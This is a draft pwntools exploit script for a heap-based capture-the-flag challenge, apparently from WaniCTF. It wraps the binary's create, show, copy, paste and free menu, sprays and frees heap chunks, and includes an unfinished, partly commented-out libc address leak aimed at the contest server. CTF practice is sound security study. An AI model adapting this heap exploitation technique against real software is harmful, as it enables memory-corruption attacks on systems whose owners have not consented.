#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall_patched")
libc = elf.libc

local = True 
if local:
    p = process("./chall_patched")
    gdb.attach(p, '''c''')
else:
    p = remote('canaleak-pwn.wanictf.org', 9006)

elf = context.binary = ELF('./chall_patched', checksec=False)

def create(idx, size, data):
	p.sendlineafter(b"your choice:", b"1")
	p.sendlineafter(b"index: ", str(idx))
	p.sendlineafter(b"size (0-4096):", str(size))
	p.sendlineafter(b"Enter your content: ", data)
	print("[+]Create ", str(idx))

def show(idx):
	p.sendlineafter(b"your choice:", b"2")
	p.sendlineafter(b"index: ", str(idx))
	print("[+]Show ", str(idx))
	
def copy(idx):
	p.sendlineafter(b"your choice:", b"3")
	p.sendlineafter(b"index: ", str(idx))
	print("[+]Copy ", str(idx))
	
def paste(idx):
	p.sendlineafter(b"your choice:", b"4")
	p.sendlineafter(b"index: ", str(idx))
	print("[+]Paste ", str(idx))

def free(idx):
	p.sendlineafter(b"your choice:", b"5")
	p.sendlineafter(b"index: ", str(idx))
	print("[+]Free ", str(idx))


for i in range(15):
	create(i, 0x80, str(i)*0x80)

for i in range(10):
	free((i+6))

#################
### Leak_libc ###
#################

#create(7, 0x8, b"a"*7)
#create(8, 0x8, b"b"*7)
#copy(7)
'''
show(8)

p.recvuntil(b"aaaaaaa\n")
libc_base = int.from_bytes(p.recv(6),"little") - 2202848 - 128
print("[+]Libc_base:	", hex(libc_base))

'''


p.interactive()
